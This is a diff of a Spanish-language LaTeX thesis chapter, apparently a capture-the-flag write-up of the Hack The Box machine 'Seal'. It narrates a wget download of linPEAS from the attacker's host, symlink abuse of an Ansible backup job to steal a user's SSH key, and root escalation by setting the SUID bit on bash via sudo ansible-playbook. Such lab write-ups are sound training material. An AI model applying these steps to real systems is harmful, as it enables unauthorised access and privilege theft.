@@ -79,7 +79,7 @@ Al ser esto un repositorio de \textit{Git}, se ha investigado \textit{commits} a
     \subfloat[\centering \textit{Seal: 8080 Histórico del archivo \texttt{tomcat-users.xml}}]{{\includegraphics[width=1.0\textwidth]{images/machines/seal/tomcat-users-history.png}}}
     \qquad
     \subfloat[\centering \textit{Seal: 8080 Archivo \texttt{tomcat-users.xml} antiguo}]{{\includegraphics[width=1.0\textwidth]{images/machines/seal/tomcat-users-commit.png}}}
-    \caption{Archivo \texttt{tomcat-users.xml}}
+    \caption{Seal: Archivo \texttt{tomcat-users.xml}}
     \label{fig:seal-tomcat-users}
 \end{figure}
 
@@ -92,7 +92,7 @@ Lo primero que se intenta es acceder a la web principal (\texttt{https://10.10.1
 \begin{figure}[h]
     \centering
     \includegraphics[width=0.80\textwidth]{images/machines/seal/etc-hosts.png}
-    \caption{Fichero \texttt{/etc/hosts} con \texttt{seal.htb}}
+    \caption{Seal: Fichero \texttt{/etc/hosts} con \texttt{seal.htb}}
     \label{fig:seal-etc-hosts}
 \end{figure}
 
@@ -115,14 +115,14 @@ En este comando se han usado los argumentos que se han usado previamente, aunque
 Del resultado obtenido\footnote{\href{https://github.com/VictorNS69/TFM/blob/main/machines/seal/03_gobuster_433.txt}{Output de \textit{03\_gobuster\_433.txt}}} destacan:
 
 \begin{itemize}
-    \item \texttt{/host-manager/html/*} (Devuelve 403 - Forbbiden)
+    \item \texttt{/host-manager/html/*} (devuelve 403 - Forbbiden)
     \item \texttt{/host-manager}
     \item \texttt{/manager}
-    \item \texttt{/manager/html} (Devuelve 403 - Forbbiden)
-    \item \texttt{/manager/html/*} (Devuelve 403 - Forbbiden)
-    \item \texttt{/manager/jmxproxy} (Devuelve 401 - Unauthorized)
-    \item \texttt{/manager/jmxproxy/*} (Devuelve 401 - Unauthorized)
-    \item \texttt{/manager/status/*} (Devuelve 401 - Unauthorized)
+    \item \texttt{/manager/html} (devuelve 403 - Forbbiden)
+    \item \texttt{/manager/html/*} (devuelve 403 - Forbbiden)
+    \item \texttt{/manager/jmxproxy} (devuelve 401 - Unauthorized)
+    \item \texttt{/manager/jmxproxy/*} (devuelve 401 - Unauthorized)
+    \item \texttt{/manager/status/*} (devuelve 401 - Unauthorized)
     \item \texttt{/manager/status.xsd}
 \end{itemize}
 
@@ -211,13 +211,13 @@ wget http://10.10.14.49:8000/linpeas.sh
 
 Una vez tenemos el archivo en la máquina víctima, le damos permisos de ejecución (\texttt{chmod +x linpeas.sh}) y lo ejecutamos.\\
 
-El resultado de \textit{linPEAS}\footnote{\href{https://github.com/VictorNS69/TFM/blob/main/machines/seal/04_linpeas_tomcat.txt}{Output de \textit{04\_linpeas\_tomcat.txt}}}, encontramos varios posibles vectores de ataque, pero ninguno ha resultado ser explotable. También se han encontrado algunos archivos ``extraños`` como \texttt{/otp/backups/archives/} y \texttt{/otp/backups/playground/} y archivos y procesos del usuario \textit{luis}.\\
+El resultado de \textit{linPEAS}\footnote{\href{https://github.com/VictorNS69/TFM/blob/main/machines/seal/04_linpeas.txt}{Output de \textit{04\_linpeas.txt}}}, encontramos varios posibles vectores de ataque, pero ninguno ha resultado ser explotable. También se han encontrado algunos archivos ``extraños`` como \texttt{/opt/backups/archives/} y \texttt{/opt/backups/playground/} y archivos y procesos del usuario \textit{luis}.\\
 
 \textit{\textbf{Nota}: con linPEAS se ha encontrado que \texttt{/usr/bin/bash} es vulnerable y es explotable para obtener un shell como root, pero se ha decidido no atacar ya que ese vector de ataque es el objetivo de esta máquina, lo que significa que otra persona ya había explotado la máquina y conseguido una shell. Por eso, se ha decidido reiniciar la máquina y dicho vector de ataque ha desaparecido.}\\
 
 Se ha intentado acceder a los archivos de \textit{luis}, como son \texttt{/home/luis/}, \texttt{/home/luis\\/.ssh} o \texttt{/home/luis/documents}, pero no se ha logrado nada, ya que con el usuario actual (\textit{tomcat}) no tenemos permisos.\\
 
-Dada la falta de exito investigando al usuario \textit{luis}, se decide investigar los archivos y directorios ``extraños`` meniconados anteriormete. En \texttt{/otp/backups/playground} se ha encontrado un archivo \texttt{run.yml} (figura \ref{fig:seal-run}). Se ha investigado en \textit{Google} y se ha encontrado que es un \textit{Ansible Playbook}\cite{ansible-playbooks}. Leyendo el archivo \texttt{run.yml}, vemos que realiza un backup del directorio \texttt{/var/lib/tomcat9/webapps/ROOT/admin/dashboard}.\\
+Dada la falta de exito investigando al usuario \textit{luis}, se decide investigar los archivos y directorios ``extraños`` meniconados anteriormete. En \texttt{/opt/backups/playground} se ha encontrado un archivo \texttt{run.yml} (figura \ref{fig:seal-run}). Se ha investigado en \textit{Google} y se ha encontrado que es un \textit{Ansible Playbook}\cite{ansible-playbooks}. Leyendo el archivo \texttt{run.yml}, vemos que realiza un backup del directorio \texttt{/var/lib/tomcat9/webapps/ROOT/admin\\/dashboard}.\\
 
 \begin{figure}[h]
     \centering
@@ -226,4 +226,75 @@ Dada la falta de exito investigando al usuario \textit{luis}, se decide investig
     \label{fig:seal-run}
 \end{figure}
 
+Decidimos copiar los directorios home de \textit{luis} y \textit{root} en \texttt{/var/lib/tomcat9/webapps\\/ROOT/admin/dashboard} (figura \ref{fig:seal-simb}), pero no tenemos permisos para realizar ninguna de las dos copias. Probamos a hacerlo con enlaces simbólicos. Primero probamos a copiar el home de \textit{luis} a la ruta mencionada, pero no podemos crear archivos en dicha ruta. Se ha investigado qué hay en \texttt{/var/lib/tomcat9/webapps/ROOT/admin/dashboard} y se han encontrado varios directorios. Se decide intentar crear el enlace simbólico en uno de esos directorios (\texttt{uploads}) y logramos copiar tanto el home de \textit{luis}, como el de \textit{root}.
 
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.9\textwidth]{images/machines/seal/enlaces-simb.png}
+    \caption{Seal: Copia de enlaces simbólicos}
+    \label{fig:seal-simb}
+\end{figure}
+
+Al copiarlo y esperar al rededor de 10 segundos, se ha generado un archivo de \textit{backup} en \texttt{/opt/backups/files}. Copiamos el archivo en una ruta temporal creada por nosotros (\texttt{/tmp/69}) para que sea más fácil de manejar y gestionar. Descomprimimos el archivo comprimido y vemos que se han copiado los archivos del home de \textit{luis}, pero no los de \textit{root}.\\
+
+Investigando los archivos de \textit{luis}, encontramos una clave \acrshort{ssh} del usuario (figura \ref{fig:seal-luis-clave})\footnote{\href{https://github.com/VictorNS69/TFM/blob/main/machines/seal/luis_id_rsa}{Archivo \textit{luis\_id\_rsa}}}.
+
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.6\textwidth]{images/machines/seal/rsa-luis.png}
+    \caption{Seal: Clave \acrshort{ssh} de \textit{luis}}
+    \label{fig:seal-luis-clave}
+\end{figure}
+
+Copiamos la clave en nuestro equipo e intentamos acceder vía \acrshort{ssh} al servidor (figura \ref{fig:seal-ssh-luis}). Logramos entrar con éxito y encontrar el flag del usuario en \texttt{/home/luis/user.txt}.
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.75\textwidth]{images/machines/seal/ssh-luis.png}
+    \caption{Seal: Login \acrshort{ssh} de \textit{luis}}
+    \label{fig:seal-ssh-luis}
+\end{figure}
+
+\subsection{Escalada de privilegios}
+
+Como ya estamos conectados a la máquina como \textit{luis}, ahora vamos a intentar obtener \textit{root}. Para ello, primero comprobamos si hay algún archivo que \textit{luis} pueda ejecutar como \textit{root}. Como se muestra en la siguiente figura (figura \ref{fig:seal-ssh-luis}), se puede ejecutar \texttt{/usr/bin/ansible-playground} como \textit{root}. De nuevo, utilizamos \textit{Google} para ver qué podemos hacer con \textit{Ansible Playground}\cite{ansible-playbooks}. Vemos que podemos ejecutar comandos como los ejecutaríamos en cualquier shell.
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.9\textwidth]{images/machines/seal/sudo-l-luis.png}
+    \caption{Seal: Comando \texttt{sudo -l}}
+    \label{fig:seal-ssh-luis}
+\end{figure}
+
+Se prueban distintos payloads para intentar obtener un shell como \textit{root}. Se prueba el mismo payload que se utilizó en la máquina anterior, pero sin éxito. Se prueba utilizando el comando \texttt{exec} para obtener un bash, pero sigue sin dar resultado. Finalmente, se decide a crear un payload\footnote{\href{https://github.com/VictorNS69/TFM/blob/main/machines/seal/pe.yml}{Archivo \textit{pe.yml}}} que modifique los permisos del comando \texttt{/usr/bin/bash}. El objetivo de este payload es modificar los permisos para que cuando se ejecute \texttt{/usr/bin\\/bash} se asigne el \texttt{euid} y \texttt{egid} (id de usuario e id de grupo respectivamente) de \textit{root}. El motivo por el cual se utiliza este payload es utilizar una de las características de \textit{Linux} que permite ejecutar archivos modificando el \textit{id efectivo} del usuario llamante; esto quiere decir que, si el creador del archivo es \textit{root}, y está habilitado el bit, se permite modificar el \textit{id} del llamante (en este caso \textit{luis}), y que utilice el \textit{id} de \textit{root}. Así, se consigue que al utilizar el comando \texttt{/usr/bin/bash}, podamos hacerlo como súper-usuario.\\
+
+A continuación, se muestran los comandos seguidos para realizar la escalada de privilegios (figura \ref{fig:seal-escalada-priv}).\\
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=1.0\textwidth]{images/machines/seal/obtencion-root.png}
+    \caption{Seal: Escalada de privilegios}
+    \label{fig:seal-escalada-priv}
+\end{figure}
+
+En la figura se realizan unos pasos extra para que sea más sencillo comprender el ataque realizado:
+\begin{enumerate}
+    \item Primero consultamos los permisos del comando \texttt{/usr/bin/bash}. Vemos que no tiene asignado el bit \texttt{s}.
+    \item Segundo, se muestra la información de \textit{luis} con el comando \texttt{id}. Vemos que \textit{luis} tiene el \textit{id efectivo} igual que el \textit{id real} (\texttt{uid=1000} y \texttt{gid=1000}).
+    \item En este punto es donde ejecutamos nuestro payload, utilizando \texttt{/usr/bin/ansible\\-playbook} como súper-usuario.
+    \item Tras la ejecución exitosa del paso anterior, volvemos a comprobar los permisos del comando \texttt{/usr/bin/bash}, y esta vez vemos que si está activado el bit \texttt{s}.
+    \item Entonces ejecutamos \texttt{bash -p} para lograr el shell con \textit{root}. Según la documentación del manual del comando \texttt{bash}\cite{bash-man}, el parámetro \texttt{-p}:
+          \begin{quote}
+              \textit{Si el shell se inicia con el ID efectivo de usuario (grupo) que no es igual al ID real de usuario (grupo), y no se suministra la opción \texttt{-p}, no se leen los archivos de inicio, las funciones del shell no se heredan del entorno, las variables \texttt{SHELLOPTS}, \texttt{BASHOPTS}, \texttt{CDPATH} y \texttt{GLOBIGNORE}, si aparecen en el entorno, se ignoran, y el ID efectivo de usuario se establece en el ID real de usuario.  Si se suministra la opción \texttt{-p} en la invocación, el comportamiento de inicio es el mismo, pero el ID de usuario efectivo no se restablece.}
+          \end{quote}
+    \item Por último, s ejecuta de nuevo el comando \texttt{id}. Se comprueba que el \textit{id real} sigue siendo el que se mostró en el paso 2, pero esta vez, el \textit{id efectivo} es el de \textit{root} (\texttt{euid=0} y \texttt{egid=0}).
+\end{enumerate}
+
+Tras obtener el shell con \textit{root}, encontramos la flag de sistema en su home (\texttt{/root}).
+
+\subsection{Resumen}
+
+En esta máquina, el mayor reto se encontraba en la enumeración y la escalada horizontal (pasar de \textit{tomcat} a \textit{luis}). Se ha dedicado un gran tiempo a la enumeración de la página en el puerto 8080/\acrshort{tcp}, ya que había dos repositorios y varios archivos. Ha costado encontrar el commit que mostraba las credenciales del usuario \textit{tomcat}.\\
+
+Analizar el servicio del puerto 443/\acrshort{tcp} también ha sido un reto, ya que mi primera idea era encontrar un \acrshort{cve}. Encontré varios \acrshort{cve}s para \textit{Apache Tomcat 9.0.31} pero ninguno daba resultado. También probé con \textit{Metasploit} pero no tuve suerte. Finalmente acabé mirando el foro público de la máquina\cite{seal-forum}, y ahí leí una pista que decía algo como ``prueba a acceder a los archivos que no deberías poder``, lo cual me hizo pensar en \textit{path/directory traversal}.\\
+
+Una vez en la máquina, usando \textit{linPEAS} y estudiando sobre \textit{Ansible Playground}, encontramos el archivo que hace backups cada poco tiempo. En este punto recordé otro de los comentarios del foro que leí que decía ``hay varias maneras de copiar archivos``, lo que me hizo pensar en los enlaces simbólicos.\\
+
+Por último, la escalada de privilegios, me resultó muy interesante, ya que tuve que estudiar el funcionamiento de \textit{Linux} con la gestión de permisos de los archivos, además de las diferencias entre \textit{id real} e \textit{id efectivo}.\\
